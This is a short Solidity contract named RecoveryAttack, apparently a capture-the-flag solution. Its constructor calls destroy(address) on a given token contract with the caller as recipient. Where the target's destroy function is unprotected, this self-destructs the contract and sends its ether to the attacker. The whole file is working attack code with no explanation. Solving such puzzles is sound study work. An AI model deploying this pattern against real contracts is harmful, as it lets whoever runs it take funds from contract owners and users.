// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract RecoveryAttack {

  constructor(address _tokenAddr) public {
    (bool result, ) = _tokenAddr.call( 
        abi.encodeWithSignature(("destroy(address)"), msg.sender)
    );
  }
}